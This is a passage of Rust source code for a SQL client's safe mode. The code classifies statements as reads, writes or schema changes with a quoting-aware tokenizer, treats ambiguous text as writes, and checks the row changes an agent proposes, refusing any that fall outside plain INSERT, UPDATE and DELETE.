//! Safe mode: which statements change data or schema, and whether a
//! connection's safe mode lets them run.
//!
//! The check is one pass over the SQL text with the editor's quoting rules
//! (`'…'`, Postgres `E'…'` with its backslash escapes, `"…"`, `` `…` ``,
//! `--` and nested `/* */` comments, Postgres `$tag$` bodies), so reads pay
//! nothing measurable. Text it can't be sure of (a string, comment or
//! dollar body that never ends, a nested comment, `\'` in a string: places
//! where servers disagree) makes its statement a write, never a read. The
//! [`Dialect`] settles what only one engine has: SQLite's `[…]` names and
//! Postgres's `E'…'` strings. It guards against slips, not against a
//! determined user: `SELECT delete_user(1)` reads as a read. Read-only
//! connections are also read-only at the server, which catches those.

use serde::{Deserialize, Serialize};

use crate::db::EngineKind;

/// Whose SQL a text is, where the engines read it differently. SQLite takes
/// `[…]` as a quoted name up to the first `]` and has no `E'…'` strings;
/// to Postgres `[` is a subscript or an array, and `E'\''` is one quote.
/// `Either` (the engine isn't known) reads it both ways, and text the two
/// read differently fails closed.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Dialect {
    Postgres,
    Sqlite,
    Either,
}

impl From<EngineKind> for Dialect {
    fn from(engine: EngineKind) -> Self {
        match engine {
            EngineKind::Postgres => Dialect::Postgres,
            EngineKind::Sqlite => Dialect::Sqlite,
        }
    }
}

/// A connection's safe mode. Saved on the connection; separate from its
/// environment label.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SafeMode {
    /// Everything runs straight away.
    #[default]
    Off,
    /// Writes and schema changes wait for the user to confirm.
    Confirm,
    /// Writes and schema changes are refused.
    ReadOnly,
}

impl SafeMode {
    pub fn is_off(&self) -> bool {
        *self == SafeMode::Off
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StatementKind {
    /// SELECT, SHOW, EXPLAIN without ANALYZE, …
    Read,
    /// SET, BEGIN, COMMIT, …: change nothing in the database.
    Session,
    /// INSERT, UPDATE, DELETE, COPY FROM, COPY TO a server file or program,
    /// CALL, and anything unrecognised.
    Write,
    /// CREATE, ALTER, DROP, TRUNCATE, GRANT, …
    Schema,
}

/// One statement of a run, as safe mode sees it.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct StatementCheck {
    pub kind: StatementKind,
    /// Upper-case verb, with the object type for schema changes:
    /// `DELETE`, `DROP TABLE`, `CREATE INDEX`.
    pub verb: String,
    /// The object it acts on as written (`public.wallets`), when found.
    pub target: Option<String>,
    /// DROP, TRUNCATE, or DELETE / UPDATE with no WHERE.
    pub destructive: bool,
    /// A statement that would let later statements write (turning
    /// `transaction_read_only` off, `READ WRITE`, `RESET ALL`,
    /// `PRAGMA query_only`, `set_config` on those settings). Refused on
    /// read-only connections.
    pub unlocks_writes: bool,
}

impl StatementCheck {
    pub fn changes_data(&self) -> bool {
        matches!(self.kind, StatementKind::Write | StatementKind::Schema)
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HoldAction {
    /// Confirm writes: shown to the user, runs once they confirm.
    Confirm,
    /// Read-only: never runs.
    Refuse,
}

/// Why a run was stopped before anything reached the database.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct SafetyHold {
    pub action: HoldAction,
    pub mode: SafeMode,
    /// The statements that caused the hold, in run order.
    pub statements: Vec<StatementCheck>,
}

/// What `mode` does with `sql`: `None` runs it. `confirmed` is the user's
/// go-ahead for this run; it never lets a read-only connection write.
pub fn hold_for(
    mode: SafeMode,
    sql: &str,
    confirmed: bool,
    dialect: Dialect,
) -> Option<SafetyHold> {
    if mode == SafeMode::Off || (mode == SafeMode::Confirm && confirmed) {
        return None;
    }
    let statements: Vec<StatementCheck> = check_sql(sql, dialect)
        .into_iter()
        .filter(|s| s.changes_data() || (mode == SafeMode::ReadOnly && s.unlocks_writes))
        .collect();
    if statements.is_empty() {
        return None;
    }
    Some(SafetyHold {
        action: if mode == SafeMode::ReadOnly {
            HoldAction::Refuse
        } else {
            HoldAction::Confirm
        },
        mode,
        statements,
    })
}

/// Checks every statement in `sql`.
pub fn check_sql(sql: &str, dialect: Dialect) -> Vec<StatementCheck> {
    tokenize(sql, dialect)
        .iter()
        .filter(|s| !s.is_empty())
        .map(|s| check_tokens(s))
        .collect()
}

/// One statement's check, from its tokens.
fn check_tokens(toks: &[Tok]) -> StatementCheck {
    let mut check = unclear_check(toks)
        .or_else(|| signal_check(toks))
        .unwrap_or_else(|| check_statement(toks));
    if sets_read_only_config(toks) {
        check.unlocks_writes = true;
    }
    check
}

/// Only reads, and calls no function but the built-ins that only compute
/// ([`COMPUTING_FUNCTIONS`]): as far as its text can tell, running it
/// changes nothing, so running it twice is the same as once. A read that
/// calls another (`SELECT write_fn()`) may write from inside it.
pub fn plain_read(sql: &str, dialect: Dialect) -> bool {
    let statements: Vec<Vec<Tok>> = tokenize(sql, dialect)
        .into_iter()
        .filter(|s| !s.is_empty())
        .collect();
    !statements.is_empty()
        && statements.iter().all(|toks| {
            let check = check_tokens(toks);
            check.kind == StatementKind::Read && !check.unlocks_writes && !calls_function(toks)
        })
}

/// Words that stand before `(` without calling a function.
const BEFORE_PARENS: &[&str] = &[
    "ALL",
    "AND",
    "ANY",
    "ARRAY",
    "AS",
    "BETWEEN",
    "BY",
    "DISTINCT",
    "ELSE",
    "EXCEPT",
    "EXISTS",
    "EXPLAIN",
    "FILTER",
    "FROM",
    "GROUP",
    "HAVING",
    "ILIKE",
    "IN",
    "INTERSECT",
    "IS",
    "JOIN",
    "LATERAL",
    "LIKE",
    "LIMIT",
    "MATERIALIZED",
    "NOT",
    "OFFSET",
    "ON",
    "ONLY",
    "OR",
    "OVER",
    "ROW",
    "SELECT",
    "SOME",
    "THEN",
    "UNION",
    "USING",
    "VALUES",
    "WHEN",
    "WHERE",
];

/// Built-in functions (and type names taking a modifier, `numeric(10, 2)`)
/// that only compute from their arguments: called bare, they write
/// nothing and change no setting. A schema-qualified or quoted name may be
/// anyone's function, so it never counts as one of these. A user who puts
/// their own schema ahead of `pg_catalog` in `search_path` can shadow
/// them; that only costs the retry after a dropped connection
/// ([`plain_read`]'s one use) its certainty, never safe mode.
const COMPUTING_FUNCTIONS: &[&str] = &[
    "ABS",
    "AGE",
    "ARRAY_AGG",
    "ARRAY_LENGTH",
    "AVG",
    "BOOL_AND",
    "BOOL_OR",
    "BTRIM",
    "CAST",
    "CEIL",
    "CEILING",
    "CHAR",
    "CHARACTER",
    "CHAR_LENGTH",
    "COALESCE",
    "CONCAT",
    "CONCAT_WS",
    "COUNT",
    "DATE_PART",
    "DATE_TRUNC",
    "DECIMAL",
    "DENSE_RANK",
    "EXTRACT",
    "FIRST_VALUE",
    "FLOOR",
    "GENERATE_SERIES",
    "GREATEST",
    "IFNULL",
    "INTERVAL",
    "JSONB_AGG",
    "JSONB_BUILD_OBJECT",
    "JSON_AGG",
    "JSON_BUILD_OBJECT",
    "LAG",
    "LAST_VALUE",
    "LEAD",
    "LEAST",
    "LEFT",
    "LENGTH",
    "LOWER",
    "LTRIM",
    "MAX",
    "MD5",
    "MIN",
    "MOD",
    "NOW",
    "NULLIF",
    "NUMERIC",
    "POSITION",
    "POWER",
    "RANK",
    "REGEXP_REPLACE",
    "REPLACE",
    "RIGHT",
    "ROUND",
    "ROW_NUMBER",
    "RTRIM",
    "SPLIT_PART",
    "SQRT",
    "STRING_AGG",
    "STRPOS",
    "SUBSTR",
    "SUBSTRING",
    "SUM",
    "TIME",
    "TIMESTAMP",
    "TO_CHAR",
    "TO_DATE",
    "TO_NUMBER",
    "TO_TIMESTAMP",
    "TRIM",
    "TRUNC",
    "UNNEST",
    "UPPER",
    "VARCHAR",
];

/// A name right before `(` that may call a function: not a keyword taking
/// parentheses, not a [`COMPUTING_FUNCTIONS`] built-in called bare, and
/// not a column list after `AS` (`AS t(a, b)`). A quoted or qualified name
/// always may.
fn calls_function(toks: &[Tok]) -> bool {
    toks.windows(2).enumerate().any(|(k, w)| {
        w[1] == Tok::Open
            && match &w[0] {
                Tok::Word(word, _) => {
                    let before = k.checked_sub(1).map(|b| &toks[b]);
                    let qualified = before == Some(&Tok::Dot);
                    qualified
                        || !(BEFORE_PARENS.contains(&word.as_str())
                            || COMPUTING_FUNCTIONS.binary_search(&word.as_str()).is_ok()
                            || before.is_some_and(|t| t.is("AS")))
                }
                Tok::Quoted(_) => true,
                _ => false,
            }
    })
}

/// Settings that keep a read-only session read-only.
fn read_only_setting(name: &str) -> bool {
    matches!(
        name.to_ascii_lowercase().as_str(),
        "transaction_read_only" | "default_transaction_read_only"
    )
}

/// Calls `set_config` on a [`read_only_setting`], or on a setting the text
/// doesn't name as a plain string (`set_config(name, …)`, `'…' || '…'`).
fn sets_read_only_config(toks: &[Tok]) -> bool {
    toks.windows(3).enumerate().any(|(k, w)| {
        w[0].name().as_deref() == Some("SET_CONFIG")
            && w[1] == Tok::Open
            && match (&w[2], toks.get(k + 3)) {
                (Tok::Str(Some(setting)), Some(Tok::Other(','))) => read_only_setting(setting),
                _ => true,
            }
    })
}

/// What a statement whose text Rowkery can't be sure of counts as.
pub const UNCLEAR_VERB: &str = "Unclear SQL";

/// A statement holding text that may read differently to the server
/// ([`Tok::Unclear`]): a write, so it fails closed.
fn unclear_check(toks: &[Tok]) -> Option<StatementCheck> {
    toks.contains(&Tok::Unclear).then(|| StatementCheck {
        kind: StatementKind::Write,
        verb: UNCLEAR_VERB.into(),
        target: None,
        destructive: false,
        unlocks_writes: false,
    })
}

/// Server functions that stop another session. They're called from a
/// SELECT, so the first word reads as a read; they count as writes.
const SIGNAL_FUNCTIONS: &[&str] = &["PG_CANCEL_BACKEND", "PG_TERMINATE_BACKEND"];

/// A statement that calls a [`SIGNAL_FUNCTIONS`] function anywhere in it,
/// by its bare or quoted name.
fn signal_check(toks: &[Tok]) -> Option<StatementCheck> {
    let called = toks.windows(2).find_map(|w| {
        let name = w[0].name()?;
        (w[1] == Tok::Open && SIGNAL_FUNCTIONS.contains(&name.as_str())).then_some(name)
    })?;
    Some(StatementCheck {
        kind: StatementKind::Write,
        destructive: called == "PG_TERMINATE_BACKEND",
        verb: called,
        target: None,
        unlocks_writes: false,
    })
}

/// How one statement of a SQL file sits with a transaction around it.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum InTransaction {
    /// Runs inside one like any other.
    Fine,
    /// `BEGIN` / `START TRANSACTION`.
    Begins,
    /// `COMMIT` / `END`.
    Commits,
    /// Any other transaction control: `ROLLBACK`, `SAVEPOINT`, `RELEASE`,
    /// `PREPARE TRANSACTION`, …
    Controls,
    /// Can't run inside one: `VACUUM`, `CREATE INDEX CONCURRENTLY`,
    /// `CREATE DATABASE`, …
    Never,
}

/// A SQL file statement as safe mode sees it, and how it sits with a
/// transaction (one tokenizing pass for both).
pub fn check_file_statement(
    sql: &str,
    dialect: Dialect,
) -> Option<(StatementCheck, InTransaction)> {
    let mut statements = tokenize(sql, dialect).into_iter().filter(|s| !s.is_empty());
    let toks = statements.next()?;
    // The file was split as the engine reads it, so this is one statement;
    // if the engine would still find two in it, the text is unclear. A
    // routine's body (`CREATE TRIGGER … BEGIN …; END`, `BEGIN ATOMIC`)
    // holds `;` and is one statement to the engine: a schema change.
    if statements.next().is_some() && !creates_routine(&toks) {
        let unclear = unclear_check(&[Tok::Unclear]).expect("unclear");
        return Some((unclear, InTransaction::Fine));
    }
    let check = check_tokens(&toks);
    let words: Vec<&str> = top_level(&toks).filter_map(Tok::word).take(4).collect();
    let concurrently = || top_level(&toks).any(|t| t.is("CONCURRENTLY"));
    let role = match words.as_slice() {
        ["BEGIN", ..] | ["START", "TRANSACTION", ..] => InTransaction::Begins,
        ["COMMIT", "PREPARED", ..] => InTransaction::Controls,
        ["COMMIT", ..] | ["END", ..] => InTransaction::Commits,
        ["ROLLBACK" | "ABORT" | "SAVEPOINT" | "RELEASE", ..] | ["PREPARE", "TRANSACTION", ..] => {
            InTransaction::Controls
        }
        ["VACUUM", ..]
        | ["ALTER", "SYSTEM", ..]
        | ["CREATE" | "DROP", "DATABASE" | "TABLESPACE" | "SUBSCRIPTION", ..] => {
            InTransaction::Never
        }
        ["CREATE" | "DROP" | "REINDEX", ..] if concurrently() => InTransaction::Never,
        _ => InTransaction::Fine,
    };
    Some((check, role))
}

/// `CREATE [OR REPLACE] [TEMP] FUNCTION | PROCEDURE | TRIGGER`, whose body
/// the SQL file reader keeps whole across its `;`.
fn creates_routine(toks: &[Tok]) -> bool {
    let words: Vec<&str> = toks.iter().take(5).filter_map(Tok::word).collect();
    let rest = match words.as_slice() {
        ["CREATE", "OR", "REPLACE", rest @ ..] | ["CREATE", rest @ ..] => rest,
        _ => return false,
    };
    let rest = match rest {
        ["TEMP" | "TEMPORARY", rest @ ..] => rest,
        _ => rest,
    };
    matches!(rest.first(), Some(&("FUNCTION" | "PROCEDURE" | "TRIGGER")))
}

/// One `SELECT`, `WITH`, `VALUES` or `TABLE` statement without a `LIMIT`,
/// `OFFSET`, `FETCH` or `INTO` of its own at the top level: what a query tab
/// pages through a cursor. Queries that bound themselves are left alone.
pub fn pages_by_cursor(sql: &str, dialect: Dialect) -> bool {
    let statements: Vec<Vec<Tok>> = tokenize(sql, dialect)
        .into_iter()
        .filter(|s| !s.is_empty())
        .collect();
    let [statement] = statements.as_slice() else {
        return false;
    };
    if statement.contains(&Tok::Unclear) {
        return false;
    }
    if !matches!(
        statement[0].word(),
        Some("SELECT" | "WITH" | "VALUES" | "TABLE")
    ) {
        return false;
    }
    let mut depth = 0i32;
    for tok in statement {
        match tok {
            Tok::Open => depth += 1,
            Tok::Close => depth -= 1,
            Tok::Word(w, _)
                if depth == 0 && matches!(w.as_str(), "LIMIT" | "OFFSET" | "FETCH" | "INTO") =>
            {
                return false
            }
            _ => {}
        }
    }
    true
}

/// Has a locking clause (`FOR UPDATE`, `FOR NO KEY UPDATE`, `FOR SHARE`,
/// `FOR KEY SHARE`) anywhere: through a cursor it would lock only the rows
/// fetched so far, not every row it matches.
pub fn locks_rows(sql: &str) -> bool {
    tokenize(sql, Dialect::Postgres).iter().any(|statement| {
        statement.windows(2).any(|pair| {
            pair[0].is("FOR") && matches!(pair[1].word(), Some("UPDATE" | "SHARE" | "NO" | "KEY"))
        })
    })
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Tok {
    /// A bare word, upper-cased, with its text as written.
    Word(String, String),
    /// A double-quoted or backticked identifier, as written.
    Quoted(String),
    /// A string: its value when the text says it plainly (closed, clear,
    /// no `E` prefix and no backslash, which a server may read as escapes).
    Str(Option<String>),
    Open,
    Close,
    Dot,
    Other(char),
    /// Text servers may read differently (see [`skip_string`],
    /// [`skip_block_comment`]) or that never ends.
    Unclear,
}

impl Tok {
    fn word(&self) -> Option<&str> {
        match self {
            Tok::Word(w, _) => Some(w),
            _ => None,
        }
    }
    fn is(&self, w: &str) -> bool {
        self.word() == Some(w)
    }
    /// A bare or quoted name, upper-cased: `"set_config"` is SET_CONFIG.
    /// A quoted name matches whatever its case; a near miss only makes the
    /// check stricter.
    fn name(&self) -> Option<String> {
        match self {
            Tok::Word(w, _) => Some(w.clone()),
            // SQLite's `[…]` has no escapes.
            Tok::Quoted(text) if text.starts_with('[') => Some(
                text[1..]
                    .strip_suffix(']')
                    .unwrap_or(&text[1..])
                    .to_ascii_uppercase(),
            ),
            Tok::Quoted(text) if text.len() >= 2 => {
                let q = &text[..1];
                Some(
                    text[1..text.len() - 1]
                        .replace(&q.repeat(2), q)
                        .to_ascii_uppercase(),
                )
            }
            _ => None,
        }
    }
}

/// Statements (split on top-level `;`) as tokens. Strings, numbers and
/// comments are dropped; dollar-quoted bodies are dropped too.
fn tokenize(sql: &str, dialect: Dialect) -> Vec<Vec<Tok>> {
    tokenize_spans(sql, dialect).0
}

/// `tokenize`, with each statement's byte range in `sql` (its `;` left out).
fn tokenize_spans(sql: &str, dialect: Dialect) -> (Vec<Vec<Tok>>, Vec<std::ops::Range<usize>>) {
    let b = sql.as_bytes();
    let mut out = vec![Vec::new()];
    let mut spans = Vec::new();
    let mut start = 0;
    let mut i = 0;
    while let Some((lexeme, end)) = lex(b, i, true, dialect) {
        let toks = out.last_mut().unwrap();
        match lexeme {
            Lexeme::String { clear } => push_string(toks, clear, &sql[i..end]),
            Lexeme::Quoted { closed } => {
                if !closed {
                    toks.push(Tok::Unclear);
                }
                toks.push(Tok::Quoted(sql[i..end].to_string()));
            }
            Lexeme::BlockComment { clear: false } => toks.push(Tok::Unclear),
            Lexeme::Dollar { closed } => {
                if !closed {
                    toks.push(Tok::Unclear);
                }
                toks.push(Tok::Other('$'));
            }
            Lexeme::Semicolon => {
                out.push(Vec::new());
                spans.push(start..i);
                start = end;
            }
            Lexeme::Open => toks.push(Tok::Open),
            Lexeme::Close => toks.push(Tok::Close),
            Lexeme::Dot => toks.push(Tok::Dot),
            Lexeme::Bracket { clear } => {
                if !clear {
                    toks.push(Tok::Unclear);
                }
                toks.push(Tok::Other('['));
            }
            Lexeme::Word => {
                let text = &sql[i..end];
                toks.push(Tok::Word(text.to_ascii_uppercase(), text.to_string()));
            }
            Lexeme::Number => toks.push(Tok::Other('0')),
            Lexeme::Other => toks.push(Tok::Other(b[i] as char)),
            Lexeme::LineComment
            | Lexeme::BlockComment { clear: true }
            | Lexeme::Space
            | Lexeme::Skip => {}
        }
        i = end;
    }
    spans.push(start..b.len().max(start));
    (out, spans)
}

/// Each statement's text as the editor splits `sql`, trimmed, empty ones
/// left out: what the SQL file reader must agree with.
#[cfg(test)]
pub(crate) fn split_statements(sql: &str) -> Vec<String> {
    let (toks, spans) = tokenize_spans(sql, Dialect::Either);
    toks.iter()
        .zip(spans)
        .filter(|(t, _)| !t.is_empty())
        .map(|(_, span)| sql[span].trim().to_string())
        .collect()
}

/// One lexeme of SQL text, as [`lex`] finds it.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Lexeme {
    /// `'…'` or `E'…'`; `clear` as [`skip_string`] judges it.
    String {
        clear: bool,
    },
    /// `"…"`, `` `…` ``, or SQLite's `[…]`.
    Quoted {
        closed: bool,
    },
    LineComment,
    /// `clear` as [`skip_block_comment`] judges it.
    BlockComment {
        clear: bool,
    },
    /// A `$tag$ … $tag$` body.
    Dollar {
        closed: bool,
    },
    /// A `$` that opens no body: nothing.
    Skip,
    /// A `[` read as Postgres reads it: a subscript or an array. With
    /// [`Dialect::Either`] SQLite may read a quoted name up to the first
    /// `]`; `clear` when both read the text up to that `]` alike
    /// ([`bracket_clear`]).
    Bracket {
        clear: bool,
    },
    Semicolon,
    Open,
    Close,
    Dot,
    Word,
    Number,
    Space,
    /// Any other byte, as itself.
    Other,
}

/// The lexeme starting at `b[i]` and where it ends, with the editor's quoting
/// rules; `None` at the end of `b`. Unless `eof`, more text may follow `b`:
/// a lexeme that might go on past it is `None` too, for the caller to read
/// more and ask again from `i` (the SQL file reader streams this way).
pub(crate) fn lex(b: &[u8], mut i: usize, eof: bool, dialect: Dialect) -> Option<(Lexeme, usize)> {
    let n = b.len();
    let start = i;
    // A lexeme that ran into the end of `b` is final only when nothing follows.
    let done = |lexeme: Lexeme, end: usize, open: bool| (eof || !open).then_some((lexeme, end));
    let c = *b.get(i)?;
    match c {
        b'\'' => {
            // Even a string closed by the last byte may go on: `''` is a quote.
            let (end, clear, _) = skip_string(b, i, false, dialect);
            done(Lexeme::String { clear }, end, end == n)
        }
        b'"' | b'`' | b'[' if c != b'[' || dialect == Dialect::Sqlite => {
            // SQLite's `[…]` ends at the first `]`, with no escape.
            let close = if c == b'[' { b']' } else { c };
            i += 1;
            while i < n && b[i] != close {
                i += 1;
            }
            let closed = i < n;
            done(Lexeme::Quoted { closed }, (i + 1).min(n), !closed)
        }
        b'-' if b.get(i + 1) == Some(&b'-') => {
            while i < n && b[i] != b'\n' {
                i += 1;
            }
            done(Lexeme::LineComment, i, i == n)
        }
        b'/' if b.get(i + 1) == Some(&b'*') => {
            let (end, clear, closed) = skip_block_comment(b, i, dialect);
            done(Lexeme::BlockComment { clear }, end, !closed)
        }
        b'-' | b'/' if i + 1 == n => done(Lexeme::Other, n, true),
        // SQLite has no dollar bodies: `$a` is a parameter name, and what
        // follows it is SQL.
        b'$' if dialect == Dialect::Sqlite => Some((Lexeme::Skip, i + 1)),
        b'$' => {
            // `$tag$ … $tag$`: the tag is empty or an identifier, so not
            // `$1`; never inside a word, which takes its own `$`.
            let mut e = i + 1;
            while e < n && (b[e].is_ascii_alphanumeric() || b[e] == b'_' || b[e] >= 0x80) {
                e += 1;
            }
            if e == n {
                return done(Lexeme::Skip, i + 1, true);
            }
            if b[e] != b'$' || b[i + 1].is_ascii_digit() {
                return Some((Lexeme::Skip, i + 1));
            }
            let tag = &b[i..=e];
            match b[e + 1..].windows(tag.len()).position(|w| w == tag) {
                Some(p) => Some((Lexeme::Dollar { closed: true }, e + 1 + p + tag.len())),
                None => done(Lexeme::Dollar { closed: false }, n, true),
            }
        }
        b'[' if dialect == Dialect::Postgres => Some((Lexeme::Bracket { clear: true }, i + 1)),
        b'[' => {
            let to = n.min(i + 1 + BRACKET_SPAN);
            let clear = match memchr::memchr(b']', &b[i + 1..to]) {
                Some(p) => bracket_clear(&b[..i + 1 + p], i + 1),
                // No `]` at all: SQLite refuses the text, Postgres reads a `[`.
                None if to == n && eof => true,
                None if to == n => return None,
                // Longer than any name or subscript a person writes.
                None => false,
            };
            Some((Lexeme::Bracket { clear }, i + 1))
        }
        b';' => Some((Lexeme::Semicolon, i + 1)),
        b'(' => Some((Lexeme::Open, i + 1)),
        b')' => Some((Lexeme::Close, i + 1)),
        b'.' => Some((Lexeme::Dot, i + 1)),
        _ if c.is_ascii_alphabetic() || c == b'_' || c >= 0x80 => {
            while i < n
                && (b[i].is_ascii_alphanumeric() || b[i] == b'_' || b[i] == b'$' || b[i] >= 0x80)
            {
                i += 1;
            }
            if i == n {
                return done(Lexeme::Word, i, true);
            }
            if i == start + 1
                && (c == b'E' || c == b'e')
                && b[i] == b'\''
                && dialect != Dialect::Sqlite
            {
                // `E'…'` takes backslash escapes: `E'\''` is one quote.
                let (end, clear, _) = skip_string(b, i, true, dialect);
                return done(Lexeme::String { clear }, end, end == n);
            }
            Some((Lexeme::Word, i))
        }
        _ if c.is_ascii_digit() => {
            while i < n && (b[i].is_ascii_alphanumeric() || b[i] == b'.') {
                i += 1;
            }
            done(Lexeme::Number, i, i == n)
        }
        _ if c.is_ascii_whitespace() => Some((Lexeme::Space, i + 1)),
        _ => Some((Lexeme::Other, i + 1)),
    }
}

/// How far past a `[` its `]` is looked for.
const BRACKET_SPAN: usize = 1024;

/// Whether Postgres reads `b[j..]`, the text between a `[` and the first
/// `]` after it (which ends `b`), as SQLite does: as text that ends at that
/// `]`, with no `;` and its parentheses balanced. SQLite takes all of it as
/// one name. Postgres then ends no string, name, comment or body past the
/// `]` and splits nothing inside it, so the tokens it sees there (a
/// superset of SQLite's) are what gets checked. `[it's]` is a name to
/// SQLite and opens a string to Postgres: not clear. Never recursive: a
/// `[` inside is one more byte.
fn bracket_clear(b: &[u8], mut j: usize) -> bool {
    let mut depth = 0i32;
    while j < b.len() {
        if b[j] == b'[' {
            j += 1;
            continue;
        }
        let Some((lexeme, end)) = lex(b, j, true, Dialect::Either) else {
            break;
        };
        match lexeme {
            Lexeme::Open => depth += 1,
            Lexeme::Close if depth == 0 => return false,
            Lexeme::Close => depth -= 1,
            // A `--` reaches the `]` unless a newline ends it first.
            Lexeme::LineComment if end == b.len() => return false,
            Lexeme::Semicolon
            | Lexeme::String { clear: false }
            | Lexeme::Quoted { closed: false }
            | Lexeme::BlockComment { clear: false }
            | Lexeme::Dollar { closed: false } => return false,
            _ => {}
        }
        j = end;
    }
    depth == 0
}

/// Past the string opening at `b[i]` (a `'`), whether every server reads
/// it the same way, and whether it closed. `''` is a quote; with `backslash`
/// (an `E'…'` string) `\` escapes the next byte too. Unclear: it never ends,
/// or it holds `\'` where that may read differently. Postgres with
/// `standard_conforming_strings` off reads it as a quote that doesn't end a
/// plain string (SQLite has no such escape); SQLite, which has no `E'…'`,
/// ends an `E'…'` string at it.
fn skip_string(b: &[u8], mut i: usize, backslash: bool, dialect: Dialect) -> (usize, bool, bool) {
    let n = b.len();
    let mut clear = true;
    i += 1;
    while i < n {
        match b[i] {
            b'\\' if backslash => {
                if b.get(i + 1) == Some(&b'\'') && dialect == Dialect::Either {
                    clear = false;
                }
                i += 2;
                continue;
            }
            b'\\' if b.get(i + 1) == Some(&b'\'') && dialect != Dialect::Sqlite => clear = false,
            b'\'' if b.get(i + 1) == Some(&b'\'') => {
                i += 2;
                continue;
            }
            b'\'' => return (i + 1, clear, true),
            _ => {}
        }
        i += 1;
    }
    (n, false, false)
}

/// Past the `/* … */` comment opening at `b[i]`, whether every server
/// reads it the same way, and whether it closed. Postgres nests them
/// (`/* /* */ */` is one comment); SQLite ends one at the first `*/`. So a
/// nested one is unclear, and so is one that never ends. Read as SQLite
/// alone, it simply ends at the first `*/`.
fn skip_block_comment(b: &[u8], mut i: usize, dialect: Dialect) -> (usize, bool, bool) {
    let n = b.len();
    let mut depth = 1;
    let mut clear = true;
    i += 2;
    while i < n {
        if dialect != Dialect::Sqlite && b[i] == b'/' && b.get(i + 1) == Some(&b'*') {
            depth += 1;
            clear = false;
            i += 2;
        } else if b[i] == b'*' && b.get(i + 1) == Some(&b'/') {
            depth -= 1;
            i += 2;
            if depth == 0 {
                return (i, clear, true);
            }
        } else {
            i += 1;
        }
    }
    (n, false, false)
}

fn push_string(toks: &mut Vec<Tok>, clear: bool, text: &str) {
    if !clear {
        toks.push(Tok::Unclear);
    }
    let value = text
        .strip_prefix('\'')
        .and_then(|t| t.strip_suffix('\''))
        .filter(|inner| clear && !inner.contains('\\'))
        .map(|inner| inner.replace("''", "'"));
    toks.push(Tok::Str(value));
}

/// Most statements one `propose_change` may hold.
pub const MAX_PROPOSED_STATEMENTS: usize = 20;

/// One statement of a change an agent proposes: a plain INSERT, UPDATE or
/// DELETE on one table.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct RowChange {
    /// `INSERT`, `UPDATE` or `DELETE`.
    pub verb: String,
    /// The table as written (`public.orders`, `"Orders"`).
    pub target: String,
    /// The statement's text, trimmed, without its `;`.
    pub sql: String,
    /// DELETE / UPDATE with no WHERE.
    pub destructive: bool,
}

/// The statements of a proposed change, or why it can't be one. Only plain
/// INSERT, UPDATE and DELETE pass: no CTEs (Rowkery wraps each statement in
/// its own to preview it), no RETURNING (Rowkery adds its own), and no
/// UPDATE … FROM or DELETE … USING (the preview matches rows of one table).
pub fn row_changes(sql: &str) -> Result<Vec<RowChange>, String> {
    let (statements, spans) = tokenize_spans(sql, Dialect::Either);
    let mut out = Vec::new();
    for (toks, span) in statements.iter().zip(spans) {
        if toks.is_empty() {
            continue;
        }
        if toks.contains(&Tok::Unclear) {
            return Err(
                "Refused: Rowkery can't be sure where a string or comment in this statement ends. Write strings as '…' with '' for a quote, and close every comment."
                    .into(),
            );
        }
        let check = check_statement(toks);
        let verb = toks[0].word().unwrap_or("");
        if !matches!(verb, "INSERT" | "UPDATE" | "DELETE") {
            return Err(format!(
                "Refused: a proposed change can only hold INSERT, UPDATE and DELETE statements, and this one starts with {}. Schema changes, CTEs and function calls stay with the user.",
                if check.verb.is_empty() { "something else" } else { check.verb.as_str() }
            ));
        }
        let word_at_top = |w: &str| top_level(toks).any(|t| t.is(w));
        if word_at_top("RETURNING") {
            return Err(
                "Refused: leave out RETURNING. Rowkery shows the user the changed rows itself."
                    .into(),
            );
        }
        if (verb == "UPDATE" && word_at_top("FROM")) || (verb == "DELETE" && word_at_top("USING")) {
            return Err(format!(
                "Refused: {verb} … {} isn't accepted in a proposed change. Name the rows with WHERE … IN (SELECT …) instead.",
                if verb == "UPDATE" { "FROM" } else { "USING" }
            ));
        }
        let Some(target) = check.target else {
            return Err(format!(
                "Refused: Rowkery couldn't tell which table this {verb} changes."
            ));
        };
        out.push(RowChange {
            verb: verb.to_string(),
            target,
            sql: sql[span].trim().to_string(),
            destructive: check.destructive,
        });
    }
    if out.is_empty() {
        return Err("There's no statement in sql.".into());
    }
    if out.len() > MAX_PROPOSED_STATEMENTS {
        return Err(format!(
            "Refused: a proposed change holds at most {MAX_PROPOSED_STATEMENTS} statements. Split it into smaller changes."
        ));
    }
    Ok(out)
}

/// The columns an UPDATE's SET assigns (`SET a = 1, (b, c) = (2, 3)`),
/// upper-cased as [`Tok::name`] gives them; none for any other statement.
pub fn assigned_columns(sql: &str) -> Vec<String> {
    let Some(toks) = tokenize(sql, Dialect::Either)
        .into_iter()
        .find(|t| !t.is_empty())
    else {
        return Vec::new();
    };
    if !toks[0].is("UPDATE") {
        return Vec::new();
    }
    let mut out = Vec::new();
    let mut depth = 0i32;
    // At the start of an assignment: right after SET or a comma between two.
    let mut start = false;
    let mut in_list = false;
    let mut set = false;
    for tok in &toks {
        match tok {
            Tok::Open => {
                if depth == 0 && start {
                    in_list = true;
                }
                depth += 1;
                start = false;
                continue;
            }
            Tok::Close => {
                depth -= 1;
                in_list = false;
                continue;
            }
            _ => {}
        }
        if depth == 0 {
            if tok.is("SET") {
                set = true;
                start = true;
                continue;
            }
            if tok.is("WHERE") || tok.is("RETURNING") || tok.is("FROM") {
                break;
            }
            if matches!(tok, Tok::Other(',')) {
                start = set;
                continue;
            }
            if start {
                if let Some(name) = tok.name() {
                    out.push(name);
                }
                start = false;
            }
        } else if depth == 1 && in_list {
            if let Some(name) = tok.name() {
                out.push(name);
            }
        }
